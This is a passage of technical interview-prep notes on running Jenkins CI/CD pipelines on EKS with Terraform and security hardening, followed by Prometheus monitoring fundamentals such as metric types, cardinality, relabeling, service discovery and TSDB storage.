  → Old nodes drained and terminated
```

**JVM Tuning — Critical for Production:**
```bash
JAVA_OPTS="\
  -Xms2g \                    # Initial heap = Xmx (avoid GC from heap growth)
  -Xmx4g \                    # Max heap — leave headroom for OS
  -XX:+UseG1GC \              # G1 GC — best for large heaps
  -XX:MaxGCPauseMillis=200 \  # Target max GC pause
  -XX:+ExplicitGCInvokesConcurrent \
  -Djava.awt.headless=true \  # No display needed
  -Djenkins.install.runSetupWizard=false"
```

**Build retention configuration:**
```groovy
pipeline {
    options {
        buildDiscarder(logRotator(
            numToKeepStr:         '20',  // Keep last 20 builds
            daysToKeepStr:        '30',  // Keep builds from last 30 days
            artifactDaysToKeepStr: '7',  // Keep artifacts 7 days
            artifactNumToKeepStr:  '5'   // Keep artifacts from last 5 builds
        ))
    }
}
```

## 9.13 Credentials Deep Dive — All Types and Scopes

**Credential types available in Jenkins:**

| Type | Use Case | Variables Created |
|------|----------|-------------------|
| Username/Password | Docker registry, Git HTTPS | `_USR`, `_PSW`, combined |
| Secret Text | API tokens, Sonar tokens | Single variable |
| Secret File | Kubeconfig, certificates | File path variable |
| SSH Private Key | Git SSH, server access | Key file + username |
| Certificate (PKCS#12) | TLS client certs | Keystore + password |
| AWS Credentials | AWS API access | Access key + secret key |

**Credential scoping (most restrictive to least):**

```
SYSTEM scope:
  Only accessible by Jenkins infrastructure (agent connections, email server)
  NOT available in pipeline Groovy code
  Lowest risk if leaked: Jenkins config access only

FOLDER scope:
  Only accessible by jobs inside that folder
  Strongest team isolation
  Use: team-specific production creds, API keys per service
  team-alpha/ jobs can use it; team-beta/ jobs get "credential not found"

GLOBAL scope:
  Accessible by ALL jobs
  Use ONLY for org-wide shared credentials (shared SonarQube, shared Nexus)
  Highest risk if leaked: all services potentially affected
```

**AWS Secrets Manager integration patterns:**

```
Pattern 1: AWS Secrets Manager Credentials Provider Plugin
  → Plugin auto-syncs secrets into Jenkins credential store
  → Secrets fetched on-demand, never stored on disk
  → Rotation in AWS → Jenkins picks up new value
  → Install: aws-secrets-manager-credentials-provider plugin

Pattern 2: IRSA + Direct API Call
  → Pod ServiceAccount → IAM Role → Secrets Manager access
  → Pipeline calls: aws secretsmanager get-secret-value
  → Most secure: no plugin credential storage at all

Pattern 3: External Secrets Operator (GitOps)
  → ExternalSecret CRD in Git config repo → ESO fetches from Secrets Manager
  → Creates Kubernetes Secret → Pod mounts as env var or file
  → Best for GitOps: secrets never in Git, auto-refreshed
```

**Credential rotation strategy:**
```
1. Store credentials in AWS Secrets Manager (source of truth)
2. Enable automatic rotation in Secrets Manager (Lambda-based)
3. Jenkins uses Credentials Provider plugin → always fetches latest
4. OR: pipeline fetches directly via IRSA → no caching, always current
5. Test: after rotation, trigger a build to verify new credential works
```

## 9.14 Terraform Integration (Infrastructure Pipeline)

**Complete Terraform pipeline on EKS:**

```groovy
pipeline {
    agent {
        kubernetes {
            yaml '''
spec:
  containers:
  - name: jnlp
    image: jenkins/inbound-agent:latest-jdk17
  - name: terraform
    image: hashicorp/terraform:1.7
    command: ["cat"]
    tty: true
'''
        }
    }

    options {
        lock(resource: 'terraform-production-state')  // Prevent concurrent applies
    }

    stages {
        stage('Init') {
            steps {
                container('terraform') {
                    sh '''
                        terraform init \
                            -backend-config="bucket=myorg-tf-state" \
                            -backend-config="key=production/terraform.tfstate" \
                            -backend-config="region=us-east-1" \
                            -backend-config="dynamodb_table=terraform-locks"
                    '''
                }
            }
        }

        stage('Plan') {
            steps {
                container('terraform') {
                    sh '''
                        terraform plan \
                            -out=tfplan \
                            -var-file=vars/production.tfvars \
                            -detailed-exitcode \
                            2>&1 | tee plan-output.txt
                    '''
                }
                archiveArtifacts artifacts: 'plan-output.txt'
            }
        }

        stage('Approval') {
            when { branch 'main' }
            agent none
            steps {
                timeout(time: 24, unit: 'HOURS') {
                    input(
                        message: 'Review Terraform plan and approve',
                        ok: 'Apply Changes',
                        submitter: 'infra-team,sre-leads'
                    )
                }
            }
        }

        stage('Apply') {
            when { branch 'main' }
            steps {
                container('terraform') {
                    sh 'terraform apply -auto-approve tfplan'
                }
            }
        }
    }
}
```

**Key principles:**
- Remote state in S3 + DynamoDB locking (never local disk)
- `plan -out=tfplan` saves plan → `apply tfplan` guarantees exact plan is applied
- Jenkins `lock()` + Terraform state locking = two independent safety locks
- Drift detection: scheduled `terraform plan -refresh-only -detailed-exitcode` (exit 2 = drift)

## 9.15 Pipeline Observability Deep Dive

**Jenkins Prometheus metrics to alert on:**

```
jenkins_queue_size_value > 50                    → PagerDuty (builds queuing)
jenkins_executor_in_use_value / total > 0.9      → Warning (capacity saturation)
jenkins_job_duration_milliseconds > 2x baseline  → Slack (pipeline degradation)
jenkins_runs_failure_total increasing             → Investigation (quality regression)
```

**Custom metrics in Jenkinsfile:**
```groovy
stage('Build') {
    steps {
        script {
            def startTime = System.currentTimeMillis()
            sh 'mvn clean package'
            def duration = (System.currentTimeMillis() - startTime) / 1000

            // Push to Prometheus Pushgateway
            sh """
                echo 'build_duration_seconds{job="${JOB_NAME}",stage="build"} ${duration}' \
                | curl --data-binary @- http://pushgateway:9091/metrics/job/jenkins
            """
        }
    }
}
```

**DORA metrics dashboard (Grafana):**
```
Panel 1: Deployment Frequency — deployments_total rate over 7 days
Panel 2: Lead Time — p50 and p95 commit-to-deploy duration
Panel 3: Change Failure Rate — failed_deployments / total_deployments
Panel 4: MTTR — median incident duration from PagerDuty
Panel 5: Build Duration Trend — p50 pipeline duration over 30 days
Panel 6: Queue Wait Time — p95 time builds spend in queue
Panel 7: Test Flakiness — quarantined tests and flakiness rate
```

**Structured pipeline logging:**
```groovy
// Add structured metadata to build for observability
script {
    currentBuild.description = "v${APP_VERSION} → ${TARGET_ENV}"
    currentBuild.displayName = "#${BUILD_NUMBER} (${GIT_COMMIT.take(7)})"

    // Record deployment event
    sh """
        curl -X POST https://deployments.internal/api/record \
            -H 'Content-Type: application/json' \
            -d '{"service":"${APP_NAME}","version":"${IMAGE_TAG}",
                 "env":"production","deployer":"${DEPLOYER}",
                 "commit":"${GIT_COMMIT}","build_url":"${BUILD_URL}"}'
    """
}
```

## 9.16 Jenkins Security Hardening Checklist

**Production security checklist:**

```
☐ Controller executors = 0
☐ HTTPS enforced (TLS termination at Ingress/ALB)
☐ CSRF protection enabled (crumb issuer)
☐ Authentication via SSO/LDAP (not local Jenkins DB)
☐ Authorization via Role Strategy plugin (RBAC)
☐ Folder-scoped credentials per team
☐ Jenkins process runs as non-root user (UID 1000)
☐ JENKINS_HOME filesystem permissions: only jenkins user
☐ secrets/ backed up separately and securely
☐ All agents connect via WebSocket or JNLP (not SSH from Controller)
☐ Agent Service Accounts have minimal RBAC
☐ NetworkPolicy isolates build pods
☐ No Run/Replay for non-admin users
☐ Script Security plugin enabled (sandbox for Groovy)
☐ Audit logging enabled
☐ Regular plugin updates (security advisories)
☐ Build pods don't have access to production secrets
☐ Fork PR trust: "Nobody" or "Users with write access"
```

**Groovy sandbox and Script Security:**
```
Jenkins runs pipeline Groovy code in a sandbox by default.
Unapproved method calls require admin approval via Script Approval page.
This prevents: arbitrary file system access, network calls, process execution
outside of sanctioned pipeline steps.

Scripts in Shared Libraries loaded as "trusted" (no sandbox) — be careful
who can commit to the Shared Library repo.
```

**Kustomize deployment pattern (alternative to Helm):**
```groovy
stage('Deploy with Kustomize') {
    steps {
        container('kubectl') {
            sh """
                cd k8s/overlays/staging
                kustomize edit set image myapp=${REGISTRY}/${APP_NAME}:${IMAGE_TAG}
                kubectl apply -k . --namespace staging
                kubectl rollout status deployment/${APP_NAME} -n staging --timeout=5m
            """
        }
    }

## 9.18 Common Interview Scenarios — Full Walkthrough

**Scenario 1: "Your CI pipeline takes 45 minutes. The CTO says it's unacceptable."**

> Diagnostic approach: (1) Profile each stage — identify where time is spent. Common culprits: dependency download (add PVC cache), serial test execution (parallelize), large Docker context (optimize .dockerignore and use multi-stage builds), full git clone of large repo (use shallow clone). (2) After identifying bottlenecks, apply fixes in order of impact. Typical optimizations: mount Maven/npm cache PVC (saves 3-5 min), parallelize lint + unit tests + SAST (saves 5-10 min), shallow clone (saves 1-2 min), Docker layer caching (saves 2-5 min), skip unchanged stages with `changeset` conditions (saves variable). (3) Set a target: CI should be under 10 minutes. If architectural changes are needed (test splitting across agents, monorepo affected-build detection), propose them as a project.

**Scenario 2: "A build has been in the queue for 30 minutes. How do you diagnose?"**

> (1) Check queue via UI or API — the "why" field shows the exact reason. (2) "No matching agent": check if agents with required label are connected. On K8s: are pods being created? Check namespace events: `kubectl get events -n jenkins-builds --sort-by=.lastTimestamp`. Common issues: node pool at max capacity (cluster autoscaler lag), pod stuck in Pending due to insufficient resources. (3) "Blocked by previous build": check if that build is hung — might need to be aborted. (4) "Throttle plugin limit": evaluate if the limit needs adjustment. (5) Systematic issue: check if quiet period is too high, or if builds are not completing and filling executors.

**Scenario 3: "We need to migrate from Jenkins to GitHub Actions. How would you plan it?"**

> (1) Inventory: list all pipelines, their complexity, and dependencies (Shared Libraries, plugins, credential references). (2) Map Jenkins concepts to GHA: Jenkinsfile → workflow YAML, Shared Libraries → reusable workflows/composite actions, Jenkins credentials → GitHub secrets/OIDC, Kubernetes plugin → self-hosted runners on EKS. (3) Migration strategy: start with simple pipelines (lint, test, build), migrate progressively, run both systems in parallel during transition. (4) Key decision: keep using EKS self-hosted runners (familiar) vs GitHub-hosted runners (simpler but less control). (5) Timeline: 3-6 months for 50 pipelines with a dedicated team.

**Scenario 4: "Design CI/CD for a new microservice from scratch."**

> (1) Repo structure: app code + Jenkinsfile + Dockerfile + Helm chart + migration scripts. (2) Branching: trunk-based development with short-lived feature branches. (3) Pipeline: checkout → build → parallel(unit tests, SAST, dependency scan) → Docker build (Kaniko) → container scan → deploy to dev (GitOps) → integration tests → promote to staging → manual gate → production. (4) Secrets: AWS Secrets Manager via IRSA. (5) Observability: Prometheus metrics, Grafana dashboards, Slack notifications. (6) Deployment: Argo CD with automated canary via Argo Rollouts. (7) Database: Flyway migrations with Expand/Contract pattern. (8) Testing: unit (JUnit), integration (Testcontainers), contract (Pact), E2E (Cypress on staging only).

# QUICK REFERENCE — INTERVIEW CHEAT SHEET

## Core Concepts One-Liners

**Architecture:**
"Jenkins Controller orchestrates, Agents execute. Controller executors = 0. On EKS: Controller as Deployment with PVC, agents as ephemeral Kubernetes pods via the Kubernetes plugin."

**Pipeline:**
"Declarative Pipeline with structured directives. Shared Libraries for DRY. Parallel stages for speed. `when` conditions for branch-specific behavior. `post` blocks for cleanup and notifications."

**Security:**
"AWS Secrets Manager for secrets, IRSA for IAM, folder-scoped credentials in Jenkins, RBAC ServiceAccounts per team in Kubernetes, NetworkPolicy to isolate build pods."

**GitOps:**
"Jenkins handles CI (build, test, push image). Argo CD handles CD (config repo → cluster reconciliation). Git is the single source of truth. Rollback = git revert."

**Scaling:**
"Scale agents horizontally, never Controller vertically. Kubernetes pod agents on spot instances. PVC caches for Maven/npm. Webhooks over polling. PERFORMANCE_OPTIMIZED durability."

**DR:**
"JCasC + secrets backup to AWS Secrets Manager + PVC VolumeSnapshots. Recovery in 3-10 minutes. Test restores quarterly."

|--------|-------------|-----|
| Controller executors > 0 | Builds starve scheduler, OOM risk | Set to 0 |

# 1. Prometheus Fundamentals

## What Prometheus Is

Prometheus is an open-source, metrics-based monitoring and alerting toolkit, originally built at SoundCloud in 2012 (inspired by Google's Borgmon), and now a CNCF graduated project (joined 2016). It is the de facto standard for cloud-native monitoring.

It runs as a **single Go binary** — no external dependencies, no JVM, no separate database process. On a configured schedule (default 15s), it scrapes HTTP `/metrics` endpoints, parses the response into timestamped samples, stores them in a local time series database (TSDB), evaluates alert rules, and fires alerts to Alertmanager.

**Interview answer:** "Prometheus is a CNCF graduated, pull-based monitoring system that scrapes HTTP endpoints, stores time series locally in its TSDB, and provides PromQL for querying. It was purpose-built for dynamic cloud-native environments where static host-based monitoring breaks down."

## Pull vs Push Model

Prometheus uses a **pull model** — it reaches out to services and asks for metrics, rather than services pushing metrics to a collector.

**Why pull wins for most cases:**

- A failed scrape is immediately visible — Prometheus marks the target `DOWN` and you can alert on it. With push, a dead service silently stops sending and the collector sees only silence — a critical observability gap.
- Applications are decoupled from the monitoring system — they just expose `/metrics` and do not need to know who consumes it.
- You can point Prometheus at any endpoint and start collecting without changing the application.

**The tradeoff:** Prometheus needs network access to targets. Short-lived batch jobs may finish before being scraped.

**Pushgateway** solves the batch job problem — jobs push their final metrics to the Pushgateway, and Prometheus pulls from it. The Pushgateway is NOT a general-purpose push mechanism. Using it for long-running services is an anti-pattern — it masks instance-level failures and creates stale metrics.

```
Batch Job --push--> Pushgateway <--pull-- Prometheus
```

**Common mistake:** Using the Pushgateway for long-running services. The `up` metric disappears, dead services still show their last pushed values, and there is no way to detect they have stopped.

```

**Retrieval Engine:** Reads `prometheus.yml`, talks to service discovery providers, spawns one goroutine per target. Each goroutine fires `HTTP GET /metrics` at the configured `scrape_interval`. If one target times out, it does NOT block others — isolation is critical at scale.

**What Prometheus adds automatically per scrape:**

```
instance="pod-ip:port"    # the target's address
job="my-service"          # the job_name from prometheus.yml

up{job="my-service", instance="..."}           1       # 1=success, 0=failure
scrape_duration_seconds{...}                   0.003   # how long the scrape took
scrape_samples_scraped{...}                    243     # how many samples returned
scrape_samples_post_metric_relabeling{...}     241     # after relabeling filters
```

The `up` metric is your free health check — it becomes 0 the instant a scrape fails.

**Important API endpoints:**

```bash
curl -X POST http://localhost:9090/-/reload      # Reload config without restart
curl http://localhost:9090/-/healthy              # Health check
curl http://localhost:9090/-/ready                # Readiness check
curl http://localhost:9090/api/v1/targets         # Active targets
curl http://localhost:9090/api/v1/status/tsdb     # TSDB stats (cardinality)
```

# 2. Time Series, Labels & Cardinality

## Time Series Data Model

Every piece of data in Prometheus is a **time series** — a stream of timestamped numeric values, uniquely identified by a metric name plus a set of key-value labels.

```
<metric_name>{<label_name>=<label_value>, ...} <value> <timestamp>

# Real examples:
http_requests_total{method="GET", handler="/api/users", status="200"} 4523 1709558400000
http_requests_total{method="POST", handler="/api/users", status="201"} 891 1709558400000
```

Each unique combination of metric name + label set = one time series.

**Key components:**

| Component | Description | Example |
|---|---|---|
| Metric name | What you are measuring | `http_requests_total` |
| Labels | Dimensions / context | `{method="GET", status="200"}` |
| Sample value | A float64 number | `4523` |
| Timestamp | Unix milliseconds | `1709558400000` |
| Instant vector | Value of series at one point in time | Used in PromQL |
| Range vector | Values of series over a time window | `[5m]` |

## Metric Types

### Counter

A counter only goes up — it monotonically increases and resets to zero on process restart.

**Use for:** Total HTTP requests, total errors, total bytes transferred — anything that accumulates.

**Critical rule:** Always query counters with `rate()` or `increase()`. Raw counter values are meaningless — they only go up and reset on restart. `rate()` automatically detects and handles resets.

### Gauge

A gauge goes up and down — it represents current state.

**Use for:** Memory usage, active connections, queue depth, temperature — anything reflecting current state.

**How to decide:** Does it accumulate over time? → Counter. Does it reflect current state? → Gauge.

### Histogram

A histogram buckets observations client-side and exposes cumulative bucket counts. The server calculates quantiles at query time using `histogram_quantile()`.

**What gets stored per histogram metric:**

```
http_request_duration_seconds_bucket{le="0.1"}    120    # 120 requests ≤ 0.1s
http_request_duration_seconds_bucket{le="0.25"}   340    # 340 requests ≤ 0.25s
http_request_duration_seconds_bucket{le="0.5"}    720    # 720 requests ≤ 0.5s
http_request_duration_seconds_bucket{le="1.0"}    950    # 950 requests ≤ 1.0s
http_request_duration_seconds_bucket{le="+Inf"}  1000    # ALL requests (= _count)
http_request_duration_seconds_sum               432.7
http_request_duration_seconds_count              1000
```

Buckets are **cumulative** — each bucket counts all observations ≤ its boundary.

**Histogram quantile accuracy** depends entirely on bucket boundary placement. Bad boundaries = wildly inaccurate percentiles. Design buckets around your SLO thresholds, not the defaults.

```
# Default Go client buckets (often wrong for web services):
.005, .01, .025, .05, .1, .25, .5, 1, 2.5, 5, 10

# Better — designed around SLO: "95% < 200ms, 99% < 500ms":
.01, .025, .05, .1, .15, .2, .25, .3, .4, .5, .75, 1.0, 2.5, 5.0
```

**Key rule:** Put more buckets where your SLO thresholds are. 8-20 buckets is the sweet spot.

### Summary

A summary computes quantiles client-side before sending to Prometheus. The quantiles are fixed at instrumentation time.

**The killer difference: Histogram vs Summary**

| Dimension | Histogram | Summary |
|---|---|---|
| Quantile calculation | Server-side (query time) | Client-side (instrumentation time) |
| Aggregatable across instances | YES — sum buckets then calculate | NO — cannot average percentiles |
| Flexibility | Query any quantile any time | Only pre-configured quantiles |
| Use in production | Preferred in most cases | Use when exact accuracy needed and no aggregation required |

**Production rule:** Always prefer Histogram over Summary for latency metrics in distributed systems — you almost always need fleet-wide percentiles across all pods.

**Interview answer:** "You cannot aggregate Summary quantiles. If pod A has p99 of 200ms and pod B has p99 of 400ms, the true fleet-wide p99 is NOT 300ms — it depends on the actual distribution. Histogram solves this by letting you sum raw bucket counts across pods first, then compute the quantile."

## Labels and Cardinality — The #1 Production Concern

**Cardinality** = the total number of unique time series, determined by unique label-value combinations.

Every unique combination of metric name + label set creates a separate time series stored in memory. Each active series costs approximately **3-5 KB of RAM**.

```
# This creates 1 series:
http_requests_total{method="GET"}

# This creates 1 MILLION series (one per user):
http_requests_total{method="GET", user_id="user-12345"}
```

**The cardinality formula:**

```
Total series = metric_count × (unique_values_label1 × unique_values_label2 × ...)
```

A histogram with 10 buckets and a high-cardinality label of 10,000 unique values creates: 10 (buckets + sum + count) × 10,000 = 120,000 series for ONE metric.

**Rule of thumb:** Labels must have **bounded, low-cardinality values** — HTTP methods (GET/POST/PUT/DELETE), status codes (200/404/500), not user IDs, request IDs, or IP addresses.

**Memory estimation:**

```
active_series × 3,500 bytes = approximate RAM requirement
100,000 series × 3,500 bytes = ~350 MB
1,000,000 series × 3,500 bytes = ~3.5 GB
```

### Series Churn

Series churn is the continuous creation and death of time series. It happens when label values change frequently — for example, `pod_template_hash` changes on every Kubernetes deployment, creating entirely new series for every metric on every affected pod.

**Impact on WAL:** Every new series writes a series record to the WAL, making it grow faster and making restarts slower (WAL must be fully replayed). Extreme churn can cause WAL replay to take 5-15 minutes.

**Impact on compaction:** Compaction cost scales with total series in the block, including dead ones. If 200k series churn through each 2-hour window alongside 50k active ones, each block contains 250k series and compaction takes 5x longer.

**Impact on queries:** Label selector evaluation scans all historical series that ever matched, including stale ones. Query time scales with total historical series, not just active ones.

### The Most Effective Single Fix for Cardinality in Kubernetes

Drop `pod_template_hash` and `controller_revision_hash` via `metric_relabel_configs`:

```yaml
metric_relabel_configs:
  - action: labeldrop
    regex: "pod_template_hash|controller_revision_hash"
```

These labels are added automatically by Kubernetes and change on every deployment. This single rule can reduce new series creation by 50-90% in environments with frequent deployments.

### Cardinality Investigation Workflow

1. Check `prometheus_tsdb_head_series` — is the count higher than expected?
2. Check `rate(prometheus_tsdb_head_series_created_total[1h]) * 3600` — thousands of new series/hour = churn problem
3. Visit TSDB status page (`/api/v1/status/tsdb`) — sort `labelValueCountByLabelName` descending; first label with >10k unique values is your suspect
4. Check `seriesCountByMetricName` — find which metrics carry the high-cardinality labels
5. Fix: add `metric_relabel_configs` labeldrop or replace rules
6. Verify: compare `scrape_samples_post_metric_relabeling` vs `scrape_samples_scraped`
7. Prevent: add cardinality growth alert, set `sample_limit` on all jobs

### When You Need High-Cardinality Data

Use two separate pipelines. Keep Prometheus for low-cardinality operational metrics (alerting, SLO tracking, capacity planning). Route per-user/per-request data to a system designed for high cardinality (ClickHouse, BigQuery, Druid, or Kafka → columnar store). Prometheus is optimized for the 1k–1M series range.

# 3. Scraping & Service Discovery (EKS + EC2)

## The Scrape Lifecycle

```
1. Service Discovery resolves a list of targets
       ↓
2. relabel_configs applied → filter/transform targets
       ↓
3. Scrape Manager schedules goroutine per target
       ↓
4. HTTP GET http://<target>/metrics at scrape_interval
       ↓
5. Response parsed (text exposition format)
       ↓
6. metric_relabel_configs applied → filter/transform samples
       ↓
7. Samples written to TSDB with timestamp = scrape start time
       ↓
8. up, scrape_duration_seconds, scrape_samples_scraped written
```

## scrape_interval vs scrape_timeout

```yaml
global:
  scrape_interval: 15s      # How often to scrape
  scrape_timeout: 10s       # How long before giving up
                             # MUST be <= scrape_interval
                             # If timeout > interval → Prometheus fails to start
  evaluation_interval: 15s   # How often to evaluate alert/recording rules
```

**Target states:** `UP` (last scrape succeeded), `DOWN` (last scrape failed — connection refused, timeout, non-200), `UNKNOWN` (never scraped yet).

## relabel_configs vs metric_relabel_configs — Critical Distinction

| | relabel_configs | metric_relabel_configs |
|---|---|---|
| **When** | BEFORE scraping — on the target | AFTER scraping — on each sample |
| **Operates on** | Target labels (`__address__`, `__meta_*`) | Metric labels and `__name__` |
| **Can drop targets** | YES — `action: drop` skips the scrape | NO — can only drop individual series |
| **Performance** | Saves bandwidth — dropped targets not scraped | Still scrapes but discards after |

```yaml
# relabel_configs — runs BEFORE the scrape
# Drops the entire target — saves bandwidth
relabel_configs:
  - source_labels: [__meta_kubernetes_pod_label_env]
    regex: "dev"
    action: drop

# metric_relabel_configs — runs AFTER the scrape
# The scrape already happened, we're filtering the response
metric_relabel_configs:
  - source_labels: [__name__]
    regex: "go_gc_.*"
    action: drop
```

## Relabel Actions — Know All Six

```yaml
# 1. keep — whitelist: only keep targets/series matching regex
- source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
  action: keep
  regex: "true"

# 2. drop — blacklist: drop targets/series matching regex
- source_labels: [env]
  action: drop
  regex: "dev|staging"

# 3. replace — copy/transform label values (DEFAULT action)
- source_labels: [__meta_kubernetes_pod_name]
  target_label: pod

# 4. labelmap — copy labels matching regex to new label names
- action: labelmap
  regex: __meta_kubernetes_pod_label_(.+)
  # __meta_kubernetes_pod_label_app=myapp → app=myapp

# 5. labeldrop — drop labels matching regex
- action: labeldrop
  regex: "pod_template_hash|controller_revision_hash"

# 6. labelkeep — keep only labels matching regex
- action: labelkeep
  regex: "job|instance|namespace|pod|container"
```

## Internal `__` Labels

Labels starting with `__` are internal — visible only during relabeling and stripped before storage.

```
__address__          → The host:port Prometheus will scrape
__scheme__           → http or https
__metrics_path__     → The path (default /metrics)
__meta_kubernetes_pod_name
__meta_kubernetes_pod_ip
__meta_kubernetes_namespace
__meta_kubernetes_pod_label_<labelname>
__meta_kubernetes_pod_annotation_<annotationname>
__meta_ec2_private_ip
__meta_ec2_tag_<tagname>
__meta_ec2_availability_zone
__meta_ec2_instance_type
```

**Key insight:** If you want to keep a `__meta` value as a label in your metrics, you MUST copy it to a non-`__` label via `relabel_configs` BEFORE it is automatically stripped. If you do not copy it, the information is lost forever.

## Kubernetes Service Discovery (EKS Focus)

Prometheus queries the Kubernetes API server directly. Five discovery roles:

| Role | Discovers | Primary use |
|---|---|---|
| `node` | All cluster nodes | Node-level metrics (kubelet) |
| `pod` | All pods | App metrics |
| `service` | All services | Blackbox probing |
| `endpoints` | Endpoint objects (pod IPs behind services) | App metrics via service |
| `endpointslice` | Like endpoints but scalable | Preferred in K8s 1.21+ |

### Complete Kubernetes Pod Discovery with Annotation-Based Opt-In

This is the most common real-world pattern — services opt in via annotations:

```yaml
# In your application's pod spec:
metadata:
  annotations:
    prometheus.io/scrape: "true"
    prometheus.io/port: "8080"
    prometheus.io/path: "/metrics"
```

```yaml
# In prometheus.yml:
- job_name: "kubernetes-pods"
  kubernetes_sd_configs:
    - role: pod

  relabel_configs:
    # Only scrape pods with opt-in annotation
    - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
      action: keep
      regex: "true"

    # Use custom metrics path if specified
    - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
      action: replace
      target_label: __metrics_path__
      regex: (.+)

    # Use custom port if specified
    - source_labels: [__address__, __meta_kubernetes_pod_annotation_prometheus_io_port]
      action: replace
      regex: "([^:]+)(?::\\d+)?;(\\d+)"
      replacement: "$1:$2"
      target_label: __address__

    # Copy useful K8s metadata as labels
    - source_labels: [__meta_kubernetes_namespace]
      target_label: namespace
    - source_labels: [__meta_kubernetes_pod_name]
      target_label: pod
    - source_labels: [__meta_kubernetes_pod_container_name]
      target_label: container
    - source_labels: [__meta_kubernetes_pod_label_app]
      target_label: app

    # Drop internal meta labels
    - action: labeldrop
      regex: __meta_kubernetes_.*
```

## EC2 Service Discovery

```yaml
- job_name: "ec2-nodes"
  ec2_sd_configs:
    - region: us-east-1
      port: 9100
      # Uses instance profile credentials automatically in AWS
      filters:
        - name: "tag:monitoring"
          values: ["true"]
        - name: "instance-state-name"
          values: ["running"]

  relabel_configs:
    - source_labels: [__meta_ec2_private_ip]
      target_label: __address__
      replacement: "$1:9100"
    - source_labels: [__meta_ec2_tag_Name]
      target_label: instance_name
    - source_labels: [__meta_ec2_tag_Environment]
      target_label: env
    - source_labels: [__meta_ec2_availability_zone]
      target_label: az
    - source_labels: [__meta_ec2_instance_type]
      target_label: instance_type
```

## File-Based Service Discovery

Prometheus watches JSON/YAML files on disk. When files change, targets update automatically — no restart needed. Any tool that can write a JSON file (Terraform, scripts, CI/CD) can integrate.

```yaml
- job_name: "file-sd"
  file_sd_configs:
    - files:
        - "/etc/prometheus/targets/*.json"
      refresh_interval: 5m
```

```json
[
  {
    "targets": ["10.0.1.42:9100", "10.0.1.43:9100"],
    "labels": {
      "job": "node-exporter",
      "env": "production",
      "datacenter": "us-east-1"
    }
  }
]
```

**Real-world use:** Terraform outputs write this JSON after provisioning EC2 instances — Prometheus discovers new instances without manual intervention.

## honor_labels

```yaml
honor_labels: false  # Default — Prometheus's labels win on conflict
                     # Scraped job="payments" → exported_job="payments"
                     # Use for normal application scraping

honor_labels: true   # Scraped labels win — Prometheus does NOT override
                     # Use ONLY for federation and Pushgateway
```

## Production Scrape Tuning Strategy

```yaml
global:
  scrape_interval: 15s
  scrape_timeout: 10s
  evaluation_interval: 15s
  body_size_limit: 20MB
  sample_limit: 100000

scrape_configs:
  # TIER 1: SLO-critical services
  - job_name: "payments-api"
    scrape_interval: 15s
    scrape_timeout: 5s
    sample_limit: 50000

  # TIER 2: Infrastructure
  - job_name: "node-exporter"
    scrape_interval: 15s
    sample_limit: 3000

  # TIER 3: Kubernetes state
  - job_name: "kube-state-metrics"
    scrape_interval: 60s
    body_size_limit: 100MB

  # TIER 4: Blackbox probes
  - job_name: "blackbox-http"
    scrape_interval: 30s
    sample_limit: 200

  # TIER 5: Pushgateway
  - job_name: "pushgateway"
    scrape_interval: 5m
    honor_labels: true
```

`sample_limit` is your safety net against cardinality bombs — if a target exceeds the limit, the entire scrape is discarded (all-or-nothing to avoid inconsistent state).

# 4. Storage (TSDB)

## Storage Architecture

```
Write path:
New samples → WAL (disk, sequential write) → Head Block (RAM)
                                                  │
                                            every 2 hours
                                                  ▼
                                        Persistent Block (disk, immutable)
```

### WAL (Write-Ahead Log)

- Every sample is written to the WAL on disk first — for crash recovery
- Sequential writes — extremely fast
- On restart, Prometheus replays the WAL to reconstruct the in-memory Head Block
- Stored in `data/wal/`
- WAL replay time scales with WAL size — high churn = slow restarts

### Head Block

- The most recent ~2 hours of data lives in RAM
- Memory usage is proportional to active time series count (~3.5 KB per series)
- Queries against recent data are served entirely from RAM — very fast

### Persistent Blocks

- When the Head Block fills 2 hours, it is flushed to disk as an immutable block
- Stored as ULID-named directories, each containing: chunks (compressed samples), index (series metadata), tombstones (deleted series), meta.json
- Blocks are periodically compacted — small blocks merged into larger ones

### Chunk Encoding

Each time series' samples are stored in **chunks** using Gorilla compression (Facebook's algorithm):

- First sample: full 64-bit timestamp + 64-bit value
- Subsequent samples: XOR delta encoding for values, variable-length delta-of-delta for timestamps
- Achieves approximately **1.37 bytes per sample** on typical workloads
- Each chunk covers a 2-hour window by default

## Retention

```bash
# Time-based retention (default: 15 days)
prometheus --storage.tsdb.retention.time=30d

# Size-based retention
prometheus --storage.tsdb.retention.size=100GB

# Both simultaneously — whichever triggers first wins
prometheus --storage.tsdb.retention.time=30d --storage.tsdb.retention.size=100GB
```

**Important retention gotchas:**

- Retention deletes **whole blocks** — a 2h block cannot be partially deleted. Actual data kept = retention + up to 1 block duration extra.
- The Head Block is NEVER subject to retention deletion. Minimum retention is always ≥ 2h.
- `retention.size` includes the WAL size (which can be 1-3x the Head Block size).
- If retention=7d and a query asks for range=30d, Prometheus silently returns only 7d of data — no error.

## Compaction

Without compaction, Prometheus would accumulate thousands of tiny 2-hour blocks. Compaction merges small blocks into progressively larger blocks:

```
Level 1:   2h blocks  (fresh from Head flush)
Level 2:   6h blocks  (3 × 2h blocks merged)
Level 3:  18h blocks  (3 × 6h blocks merged)
Level 4:  36h blocks  (max = 1/10 of retention period)

For retention=15d: max block = 36h
For retention=30d: max block = 72h
```

**Compaction benefits:**

- Fewer files to open for range queries
- Better chunk compression across longer windows
- Tombstones resolved (deleted series truly removed)
- Index deduplicated

Compaction is automatic and runs in the background.

## Block Deletion and Tombstones

When you delete a series via the Admin API, Prometheus does NOT immediately remove data. It writes a tombstone record (soft delete). At the next compaction, the entire block is rewritten without the deleted data (hard delete). This is because chunk files are immutable.

```bash
# Delete series via Admin API (requires --web.enable-admin-api)
curl -X POST -d '...' 'http://localhost:9090/api/v1/admin/tsdb/delete_series?...'

# Force compaction of deletions
curl -X POST http://localhost:9090/api/v1/admin/tsdb/clean_tombstones
```

## Remote Write / Read

**Remote write** streams all scraped samples to external long-term storage in real time. It is WAL-backed — if remote storage is temporarily unavailable, Prometheus buffers in the WAL and replays on recovery.

```yaml
remote_write:
  - url: "https://mimir.company.com/api/v1/push"
    queue_config:
      capacity: 10000
      max_shards: 200       # Parallel HTTP connections
      max_samples_per_send: 500
      batch_send_deadline: 5s

    write_relabel_configs:
      # Only send production metrics
      - source_labels: [env]
        action: keep
        regex: "production"
      # Drop internal metrics
      - source_labels: [__name__]
        action: drop
